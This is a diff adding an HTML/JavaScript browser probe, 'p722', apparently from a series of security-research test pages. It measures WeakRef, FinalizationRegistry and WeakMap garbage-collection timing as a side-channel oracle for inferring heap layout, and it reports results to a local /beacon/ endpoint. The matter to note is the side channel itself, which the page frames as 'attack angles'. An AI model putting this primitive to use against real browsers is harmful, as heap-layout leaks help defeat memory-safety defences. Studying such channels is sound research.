@@ -1,0 +1,300 @@
+<!--
+  p722: WeakRef + GC timing oracle for heap layout inference
+
+  WeakRef and FinalizationRegistry expose GC behavior to JavaScript.
+  The timing of WeakRef.deref() returning undefined (object collected)
+  versus the held object reveals GC sweep ordering, which depends on
+  heap block layout.
+
+  Key insight: if GC sweeps heap blocks in address order, objects
+  allocated close together are collected in the same sweep pass.
+  By creating objects with known allocation patterns and observing
+  which WeakRefs die first, we can infer relative heap positions.
+
+  Attack angles:
+  A) WeakRef survival timing -- allocate N objects, wrap in WeakRef,
+     drop strong refs, measure which die first under GC pressure.
+  B) FinalizationRegistry ordering -- register N objects, observe
+     callback invocation order after GC. Address-ordered?
+  C) GC pressure threshold -- allocate until WeakRef targets die.
+     The threshold reveals heap size and residency.
+  D) Cross-type GC ordering -- WeakRef targets of different types
+     (Array, Object, Map, Set). Type-partitioned heaps collect
+     independently.
+  E) WeakRef + setTimeout interaction -- GC during microtask vs
+     macrotask. The timing window reveals scheduler integration.
+  F) WeakMap key enumeration timing -- WeakMap cannot be enumerated
+     but has/get timing may vary with internal table state.
+
+  CRASH_CLASS: LOW (GC observation, no mutation)
+  prior art: p718 (Promise/Microtask), p608 (ResizableAB GC)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p722</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+async function main(){
+  b('P722-START:WEAKREF-GC-TIMING');
+  var results = [];
+
+  // === SECTION A: WeakRef survival ordering ===
+  b('A:WEAKREF-SURVIVAL');
+  try {
+    var N = 100;
+    var refs = [];
+    var aliveAt = [];
+
+    // Allocate N objects in order
+    for (var i = 0; i < N; i++) {
+      var obj = {id: i, payload: new Array(100).fill(i)};
+      refs.push(new WeakRef(obj));
+    }
+    // Strong refs dropped (obj goes out of scope each iteration)
+
+    // Apply GC pressure in waves
+    for (var wave = 0; wave < 10; wave++) {
+      var garbage = [];
+      for (var j = 0; j < 50000; j++) {
+        garbage.push({x: j, y: new Array(5)});
+      }
+      garbage = null;
+
+      await new Promise(function(r) { setTimeout(r, 50); });
+
+      // Count survivors
+      var alive = 0;
+      var firstDead = -1;
+      var lastAlive = -1;
+      for (var i = 0; i < N; i++) {
+        if (refs[i].deref() !== undefined) {
+          alive++;
+          lastAlive = i;
+        } else if (firstDead < 0) {
+          firstDead = i;
+        }
+      }
+      aliveAt.push(alive);
+      if (wave < 5) {
+        b('A:WAVE' + wave + ':alive=' + alive + ',firstDead=' + firstDead + ',lastAlive=' + lastAlive);
+      }
+    }
+    b('A:SURVIVAL-CURVE:' + aliveAt.join(','));
+
+    // Check if death order correlates with allocation order
+    var deadIndices = [];
+    for (var i = 0; i < N; i++) {
+      if (refs[i].deref() === undefined) deadIndices.push(i);
+    }
+    if (deadIndices.length >= 2) {
+      var monotonic = true;
+      for (var i = 1; i < deadIndices.length; i++) {
+        if (deadIndices[i] < deadIndices[i-1]) { monotonic = false; break; }
+      }
+      b('A:DEATH-MONOTONIC=' + monotonic + ',DEAD=' + deadIndices.length);
+      if (!monotonic) results.push('A:non-monotonic-gc');
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: FinalizationRegistry callback ordering ===
+  b('B:FR-ORDERING');
+  try {
+    var frOrder = [];
+    var fr = new FinalizationRegistry(function(held) {
+      frOrder.push(held);
+    });
+
+    // Register 50 objects
+    for (var i = 0; i < 50; i++) {
+      var obj = {id: i, data: new Array(50).fill(0)};
+      fr.register(obj, i);
+    }
+
+    // GC pressure
+    for (var wave = 0; wave < 5; wave++) {
+      var g = [];
+      for (var j = 0; j < 100000; j++) g.push(new Array(3));
+      g = null;
+      await new Promise(function(r) { setTimeout(r, 100); });
+    }
+
+    b('B:FR-COUNT=' + frOrder.length);
+    if (frOrder.length > 0) {
+      b('B:FR-ORDER:' + frOrder.slice(0, 30).join(','));
+      var sequential = true;
+      for (var i = 1; i < frOrder.length; i++) {
+        if (frOrder[i] < frOrder[i-1]) { sequential = false; break; }
+      }
+      b('B:FR-SEQUENTIAL=' + sequential);
+      if (!sequential) results.push('B:non-sequential-fr');
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: GC pressure threshold ===
+  b('C:GC-THRESHOLD');
+  try {
+    var sentinel = {alive: true};
+    var sentinelRef = new WeakRef(sentinel);
+    sentinel = null;
+
+    var allocCount = 0;
+    var totalBytes = 0;
+    var thresholdFound = false;
+
+    for (var batch = 0; batch < 100; batch++) {
+      var chunk = [];
+      for (var i = 0; i < 10000; i++) {
+        chunk.push(new Array(10));
+        allocCount++;
+        totalBytes += 80;
+      }
+      chunk = null;
+
+      await new Promise(function(r) { setTimeout(r, 10); });
+
+      if (sentinelRef.deref() === undefined) {
+        b('C:SENTINEL-DIED-AT:allocs=' + allocCount + ',bytes~' + totalBytes);
+        thresholdFound = true;
+        break;
+      }
+    }
+    if (!thresholdFound) {
+      b('C:SENTINEL-SURVIVED:allocs=' + allocCount);
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Cross-type GC ordering ===
+  b('D:CROSS-TYPE-GC');
+  try {
+    var types = ['Array', 'Object', 'Map', 'Set'];
+    var typeRefs = {};
+    var typeDeath = {};
+
+    for (var t = 0; t < types.length; t++) {
+      typeRefs[types[t]] = [];
+      typeDeath[types[t]] = [];
+      for (var i = 0; i < 20; i++) {
+        var obj;
+        switch(types[t]) {
+          case 'Array': obj = new Array(50).fill(i); break;
+          case 'Object': obj = {id: i, data: new Array(50)}; break;
+          case 'Map': obj = new Map(); for(var k=0;k<50;k++) obj.set(k,i); break;
+          case 'Set': obj = new Set(); for(var k=0;k<50;k++) obj.add(k*1000+i); break;
+        }
+        typeRefs[types[t]].push(new WeakRef(obj));
+      }
+    }
+
+    // GC pressure
+    for (var wave = 0; wave < 5; wave++) {
+      var g = [];
+      for (var j = 0; j < 80000; j++) g.push({x: j});
+      g = null;
+      await new Promise(function(r) { setTimeout(r, 80); });
+
+      for (var t = 0; t < types.length; t++) {
+        var alive = 0;
+        for (var i = 0; i < 20; i++) {
+          if (typeRefs[types[t]][i].deref() !== undefined) alive++;
+        }
+        if (wave === 4) typeDeath[types[t]] = 20 - alive;
+      }
+    }
+
+    var deathReport = [];
+    for (var t = 0; t < types.length; t++) {
+      deathReport.push(types[t] + ':' + typeDeath[types[t]]);
+    }
+    b('D:TYPE-DEATHS:' + deathReport.join(','));
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: WeakRef + setTimeout timing ===
+  b('E:WEAKREF-TIMER');
+  try {
+    var timerResults = [];
+
+    for (var delay = 0; delay <= 200; delay += 25) {
+      var obj = {timer: delay, data: new Array(200)};
+      var ref = new WeakRef(obj);
+      obj = null;
+
+      // Allocate garbage
+      var g = [];
+      for (var j = 0; j < 50000; j++) g.push({});
+      g = null;
+
+      await new Promise(function(r) { setTimeout(r, delay); });
+      var alive = ref.deref() !== undefined;
+      timerResults.push(delay + ':' + (alive ? 'A' : 'D'));
+    }
+    b('E:TIMER-RESULTS:' + timerResults.join(','));
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: WeakMap timing ===
+  b('F:WEAKMAP-TIMING');
+  try {
+    var wm = new WeakMap();
+    var keys = [];
+    for (var i = 0; i < 1000; i++) {
+      var k = {id: i};
+      wm.set(k, i * 100);
+      keys.push(k);
+    }
+
+    // Measure has/get timing with all keys alive
+    var hasTimes = [];
+    for (var round = 0; round < 10; round++) {
+      var t0 = performance.now();
+      for (var i = 0; i < keys.length; i++) {
+        wm.has(keys[i]);
+        wm.get(keys[i]);
+      }
+      hasTimes.push((performance.now() - t0).toFixed(3));
+    }
+    b('F:HAS-GET-TIMES:' + hasTimes.join(','));
+
+    // Drop half the keys
+    for (var i = 0; i < 500; i++) keys[i] = null;
+
+    // GC
+    var g = [];
+    for (var j = 0; j < 100000; j++) g.push({});
+    g = null;
+    await new Promise(function(r) { setTimeout(r, 100); });
+
+    // Measure with half-dead
+    var halfTimes = [];
+    for (var round = 0; round < 10; round++) {
+      var t0 = performance.now();
+      for (var i = 500; i < 1000; i++) {
+        wm.has(keys[i]);
+        wm.get(keys[i]);
+      }
+      halfTimes.push((performance.now() - t0).toFixed(3));
+    }
+    b('F:HALF-DEAD-TIMES:' + halfTimes.join(','));
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P722-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P722-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P722-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p722: WeakRef + GC timing oracle</pre></body></html>
